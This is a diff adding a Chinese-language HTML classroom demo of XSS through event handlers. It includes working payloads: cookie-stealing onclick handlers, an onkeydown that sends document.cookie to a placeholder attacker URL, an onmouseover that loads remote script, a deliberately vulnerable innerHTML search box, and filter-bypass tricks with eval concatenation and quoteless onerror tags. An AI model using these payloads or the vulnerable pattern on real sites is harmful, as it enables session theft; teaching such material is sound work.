@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS核心事件 - 鼠标/键盘/HTML事件整合演示</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "微软雅黑", Arial, sans-serif;
+        }
+        body {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.8;
+            color: #333;
+        }
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #3498db;
+            margin: 30px 0 15px;
+            padding-left: 10px;
+            border-left: 4px solid #3498db;
+        }
+        h3 {
+            color: #2980b9;
+            margin: 20px 0 10px;
+        }
+        .demo-block {
+            margin: 15px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #f8f9fa;
+        }
+        .demo-element {
+            padding: 12px 20px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+            display: inline-block;
+        }
+        input, select {
+            padding: 8px 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 300px;
+        }
+        button {
+            padding: 8px 15px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+        .note {
+            background: #fff3cd;
+            padding: 10px 15px;
+            border-left: 4px solid #ffc107;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .xss-scene {
+            color: #dc3545;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <h1>XSS漏洞核心 - 事件触发实战演示</h1>
+<div style="background-color:red" onmouseenter="alert(123)">123456</div>
+    <div class="note">
+        核心逻辑：当&lt;script&gt;标签被过滤时，攻击者通过绑定「事件」让恶意JS代码在特定行为下执行，这是XSS绕过的核心手段！
+    </div>
+
+    <!-- 第一模块：鼠标事件（XSS高频触发方式） -->
+    <h2>一、鼠标事件（用户交互最易触发）</h2>
+    <div class="demo-block">
+        <h3>1. onclick（点击触发）</h3>
+        <div class="demo-element" onclick="alert('基础场景：点击触发onclick')">点击我（基础演示）</div>
+        <div class="demo-element xss-scene" onclick="alert('XSS场景：窃取Cookie→'+document.cookie)">点击我（XSS：偷Cookie）</div>
+
+        <h3>2. onmouseover（悬浮触发，无需点击）</h3>
+        <div class="demo-element" onmouseover="alert('基础场景：鼠标悬浮触发onmouseover')" style="background: #e8f4fd;">鼠标移到我身上</div>
+        <div class="demo-element xss-scene" onmouseover="var s=document.createElement('script');s.src='http://攻击者/恶意.js';document.body.appendChild(s)">鼠标移到我身上（XSS：加载远程JS）</div>
+
+        <h3>3. oncontextmenu（右键触发）</h3>
+        <div class="demo-element" oncontextmenu="alert('基础场景：右键触发oncontextmenu');return false;">右键点击我（阻止默认菜单）</div>
+
+        <h3>4. onmousedown（鼠标按下触发）</h3>
+        <div class="demo-element" onmousedown="alert('基础场景：鼠标按下触发onmousedown')">按住我（不松开也触发）</div>
+    </div>
+
+    <!-- 第二模块：键盘事件（输入框/搜索框XSS场景） -->
+    <h2>二、键盘事件（输入交互场景专用）</h2>
+    <div class="demo-block">
+        <h3>1. onkeydown（按键按下，例：按回车）</h3>
+        <input type="text" placeholder="输入内容后按回车" onkeydown="if(event.keyCode===13){alert('基础场景：按回车→'+this.value);}">
+        <input type="text" placeholder="输入内容后按回车（XSS）" class="xss-scene" onkeydown="if(event.key==='Enter'){fetch('http://攻击者/接收.php?cookie='+document.cookie);alert('XSS：已发送Cookie到攻击者服务器');}">
+
+        <h3>2. onkeyup（按键松开触发，例：ESC）</h3>
+        <input type="text" placeholder="按ESC键松开后触发" onkeyup="if(event.key==='Escape'){alert('基础场景：松开ESC触发onkeyup');}">
+
+        <h3>3. 实战：有漏洞的搜索框（按回车触发XSS）</h3>
+        <input id="search" type="text" placeholder="输入Payload：&lt;img src=x onerror=alert(1)&gt; 按回车" onkeydown="if(event.keyCode===13){document.getElementById('search-result').innerHTML=this.value;}">
+        <div id="search-result" style="margin-top:10px;padding:10px;border:1px solid #ddd;min-height:40px;"></div>
+    </div>
+
+    <!-- 第三模块：HTML事件（无交互触发，盲打XSS核心） -->
+    <h2>三、HTML事件（无需用户主动操作）</h2>
+    <div class="demo-block">
+        <h3>1. onerror（加载失败触发，XSS绕过王牌）</h3>
+        <img src="不存在的图片.jpg" onerror="alert('基础场景：图片加载失败触发onerror')" alt="测试图" style="width: 100px; height: 100px;">
+        <div class="note">XSS经典用法：&lt;img src=x onerror=alert(1)&gt;（无引号、无闭合，极易绕过过滤）</div>
+        <div class="demo-element xss-scene" onclick="document.write('<img src=x onerror=alert(\'XSS绕过：onerror无引号写法\')>')">点击生成onerror绕过代码</div>
+
+        <h3>2. onload（页面/元素加载完成触发）</h3>
+        <iframe src="" onload="alert('基础场景：iframe加载完成触发onload')" style="display: none;"></iframe>
+        <div class="note">XSS盲打用法：&lt;body onload=alert(document.cookie)&gt;（页面加载即触发，无需用户操作）</div>
+
+        <h3>3. onsubmit（表单提交触发）</h3>
+        <form onsubmit="alert('基础场景：表单提交触发onsubmit');return true;">
+            <input type="text" name="username" placeholder="输入任意内容">
+            <button type="submit">提交表单</button>
+        </form>
+
+        <h3>4. onchange（下拉框选择触发）</h3>
+        <select onchange="alert('基础场景：选择选项触发onchange→'+this.value)">
+            <option value="1">请选择省份</option>
+            <option value="2">北京市</option>
+            <option value="3">上海市</option>
+        </select>
+    </div>
+
+    <!-- 第四模块：XSS实战绕过组合 -->
+    <h2>四、XSS实战：事件组合绕过技巧</h2>
+    <div class="demo-block">
+        <h3>1. 多事件组合触发</h3>
+        <div class="demo-element xss-scene" onclick="alert(1)" onmouseover="alert(1)">点击/悬浮都触发（绕过滤规则）</div>
+
+        <h3>2. 代码拼接绕过（过滤alert关键字时）</h3>
+        <div class="demo-element xss-scene" onclick="var a='ale';var b='rt';eval(a+b+'(\\'拼接绕过alert\\')')">点击测试拼接绕过</div>
+
+        <h3>3. 无引号/无闭合绕过（核心）</h3>
+        <pre style="background: #2d2d2d; color: #f8f8f8; padding: 10px; margin: 10px 0; font-size: 14px; border-radius: 4px;">
+&lt;img src=x onerror=alert(1)&gt;
+&lt;div onclick=alert(document.cookie)&gt;点击我&lt;/div&gt;
+        </pre>
+    </div>
+
+    <!-- 小结 -->
+    <h2>五、核心总结</h2>
+    <div class="demo-block">
+        <ol>
+            <li>鼠标事件：<span class="xss-scene">onclick/onmouseover</span> 是高频触发方式，依赖用户交互；</li>
+            <li>HTML事件：<span class="xss-scene">onerror/onload</span> 是盲打XSS核心，无需用户操作；</li>
+            <li>绕过关键：无引号写法、代码拼接、多事件组合，可躲避大部分过滤规则；</li>
+            <li>XSS本质：无论哪种事件，最终都是让浏览器执行恶意JS代码！</li>
+        </ol>
+    </div>
+
+    <script>
+        window.onload = function() {
+            console.log("XSS事件演示页面加载完成，可开始课堂演示！");
+        }
+    </script>
+</body>
+</html>
